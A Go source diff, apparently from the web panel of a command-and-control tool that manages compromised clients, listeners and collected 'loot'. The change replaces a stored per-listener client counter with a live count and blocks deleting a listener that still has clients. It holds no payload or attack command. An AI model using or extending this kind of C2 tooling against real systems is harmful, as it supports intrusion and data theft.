@@ -496,15 +496,12 @@ func User_index(web_route string)http.HandlerFunc {
 					case "delInfo": // 删除客户端
                         uid := r.URL.Query().Get("uid")
                         info := r.URL.Query().Get("info")
-                        var (
-                            serverRemark string
-                            found        bool
-                        )
+
+                        var found bool
                         if info != "" {
                             windows_clientMu.Lock()
                             for i := range windows_client_data.Clients {
                                 if uid == windows_client_data.Clients[i].Uid {
-                                    serverRemark = windows_client_data.Clients[i].Server
                                     lastIdx := len(windows_client_data.Clients) - 1
                                     windows_client_data.Clients[i] = windows_client_data.Clients[lastIdx]
                                     windows_client_data.Clients = windows_client_data.Clients[:lastIdx]
@@ -517,11 +514,9 @@ func User_index(web_route string)http.HandlerFunc {
                             clientDataMu.Lock()
                             for i := range client_data.Clients {
                                 if uid == client_data.Clients[i].Uid {
-                                    serverRemark = client_data.Clients[i].Server
                                     lastIdx := len(client_data.Clients) - 1
                                     client_data.Clients[i] = client_data.Clients[lastIdx]
                                     client_data.Clients = client_data.Clients[:lastIdx]
-                                    
                                     found = true
                                     break
                                 }
@@ -531,19 +526,6 @@ func User_index(web_route string)http.HandlerFunc {
                         if !found {
                             http.Error(w, "client not found", http.StatusNotFound)
                             return
-                        }
-                        if serverRemark != "" {
-                            serverDataMu.Lock()
-                            for i := range server_data.Servers {
-                                server := &server_data.Servers[i]
-                                if server.Remark == serverRemark {
-                                    if server.Clients > 0 {
-                                        server.Clients--
-                                    }
-                                    break
-                                }
-                            }
-                            serverDataMu.Unlock()
                         }
 
 						keyMu.Lock()
@@ -810,52 +792,76 @@ func User_index(web_route string)http.HandlerFunc {
                     case "delserver":
 
                         port := r.URL.Query().Get("port")
+                    
+                        var (
+                            serverRemark string
+                            found        bool
+                        )
+                    
+                        serverDataMu.RLock()
+                        for _, server := range server_data.Servers {
+                            if server.Port == port {
+                                serverRemark = server.Remark
+                                found = true
+                                break
+                            }
+                        }
+                        serverDataMu.RUnlock()
+                    
+                        if !found {
+                            stopStr := fmt.Sprintf(log_word["no_found_server"], port)
+                            logger.WriteLog(stopStr)
+                            return
+                        }
+                    
+                        clientDataMu.RLock()
+                        for _, c := range client_data.Clients {
+                            if c.Server == serverRemark {
+                                clientDataMu.RUnlock()
+                                stopStr := fmt.Sprintf(log_word["stop_server"])
+                                fmt.Fprint(w, stopStr)
+                                logger.WriteLog(stopStr)
+                                return
+                            }
+                        }
+                        clientDataMu.RUnlock()
+                    
+                        windows_clientMu.RLock()
+                        for _, c := range windows_client_data.Clients {
+                            if c.Server == serverRemark {
+                                windows_clientMu.RUnlock()
+                                stopStr := fmt.Sprintf(log_word["stop_server"])
+                                fmt.Fprint(w, stopStr)
+                                logger.WriteLog(stopStr)
+                                return
+                            }
+                        }
+                        windows_clientMu.RUnlock()
 
-						var needStop bool
-						found := false
-						
-						serverDataMu.Lock()
-						for i := len(server_data.Servers) - 1; i >= 0; i-- {
-						    server := &server_data.Servers[i]
-						    if port == server.Port {
-						        if server.Clients != 0 {
-						            serverDataMu.Unlock()
-						            stopStr := fmt.Sprintf(log_word["stop_server"])
-						            fmt.Fprint(w, stopStr)
-						            logger.WriteLog(stopStr)
-						            return
-						        }
-						
-						        server_data.Servers = append(
-						            server_data.Servers[:i],
-						            server_data.Servers[i+1:]...,
-						        )
-						        found = true
-						        needStop = true
-						        break
-						    }
-						}
-						serverDataMu.Unlock()
-						
-						if !found {
-						    stopStr := fmt.Sprintf(log_word["no_found_server"], port)
-						    logger.WriteLog(stopStr)
-						    return
-						}
-						if needStop {
-						    baseMutex.Lock()
-						    delete(base_map, port)
-						    baseMutex.Unlock()
-						
-						    cmapMutex.Lock()
-						    delete(code_map, port)
-						    cmapMutex.Unlock()
-						
-						    go protocol.StopServer(port)
-						
-						    stopStr := fmt.Sprintf(log_word["removed_server"], port)
-						    logger.WriteLog(stopStr)
-						}
+                        serverDataMu.Lock()
+                        for i := len(server_data.Servers) - 1; i >= 0; i-- {
+                            if server_data.Servers[i].Port == port {
+                                server_data.Servers = append(
+                                    server_data.Servers[:i],
+                                    server_data.Servers[i+1:]...,
+                                )
+                                break
+                            }
+                        }
+                        serverDataMu.Unlock()
+
+                        baseMutex.Lock()
+                        delete(base_map, port)
+                        baseMutex.Unlock()
+                    
+                        cmapMutex.Lock()
+                        delete(code_map, port)
+                        cmapMutex.Unlock()
+                    
+                        go protocol.StopServer(port)
+                    
+                        stopStr := fmt.Sprintf(log_word["removed_server"], port)
+                        logger.WriteLog(stopStr)
                     case "getloot":
 
                         uid := r.URL.Query().Get("uid")
@@ -1659,7 +1665,7 @@ func updateServerClients(port, protocol string, serverChan chan<- string) {
     for i := range server_data.Servers {
         server := &server_data.Servers[i]
         if port == server.Port && strings.HasPrefix(protocol, server.Protocol) {
-            server.Clients++
+            // server.Clients++
             serverRemark = server.Remark 
             break
         }
@@ -2812,22 +2818,39 @@ func Del_shell_innet(target,uid string)string{
     }
     return "cannot deleted target"
 }
-func Check_clients()([]map[string]string, error) {
+func Check_clients() ([]map[string]string, error) { 
+    serverCount := make(map[string]int)
+
+    // 普通客户端
+    clientDataMu.RLock()
+    for _, c := range client_data.Clients {
+        serverCount[c.Server]++
+    }
+    clientDataMu.RUnlock()
+
+    // Windows_pro 客户端
+    windows_clientMu.RLock()
+    for _, c := range windows_client_data.Clients {
+        serverCount[c.Server]++
+    }
+    windows_clientMu.RUnlock()
+    
+    // 根据 server_data.Servers.Remark 生成结果
     serverDataMu.RLock()
     defer serverDataMu.RUnlock()
-    check_map := make([]map[string]string, 0, len(server_data.Servers))
-    for i := range server_data.Servers {
-        server := &server_data.Servers[i]
-        check_info := map[string]string{
+    result := make([]map[string]string, 0, len(server_data.Servers))
+    for _, server := range server_data.Servers {
+        count := serverCount[server.Remark]
+        info := map[string]string{
             "port":   server.Port,
-            "client": strconv.Itoa(server.Clients),
+            "client": strconv.Itoa(count),
         }
-        check_map = append(check_map, check_info)
+        result = append(result, info)
     }
-    if len(check_map) == 0 {
-        return nil, fmt.Errorf("no clients found for the port:")
+    if len(result) == 0 {
+        return nil, fmt.Errorf("no servers found")
     }
-    return check_map, nil
+    return result, nil
 }
 func Check_Time_Pro()([]map[string]string, error){
     windows_clientMu.RLock()
@@ -3748,7 +3771,7 @@ type Server struct{
     Protocol   string `json:"protocol"`
     CertPath   string `json:"certPath"`
     KeyPath    string `json:"keyPath"`
-    Clients    int    `json:"clients"`
+    // Clients    int    `json:"clients"`
     User       string `json:"user"`
     Remark     string `json:"remark"`
     Uid        string `json:"uid"`
@@ -3943,7 +3966,7 @@ type MyServer struct{}
 func (s *MyServer) PutServer(
     port, path, connPath, msgPath,switch_key,encry_key,download,result,net,info,
     upload,list,option,protocol, username, remark string,
-    certPEM, keyPEM,uid,hostname,keyPart,filekey,windows_pro,base_rounds string, clients int,
+    certPEM, keyPEM,uid,hostname,keyPart,filekey,windows_pro,base_rounds string,
 ) bool {
     serverDataMu.Lock()
     defer serverDataMu.Unlock()
@@ -3974,7 +3997,7 @@ func (s *MyServer) PutServer(
         Protocol: protocol,
         CertPath: certPEM,
         KeyPath:  keyPEM,
-        Clients:  clients,
+        // Clients:  clients,
         User: username,
         Remark:   remark,
         Uid:     uid,
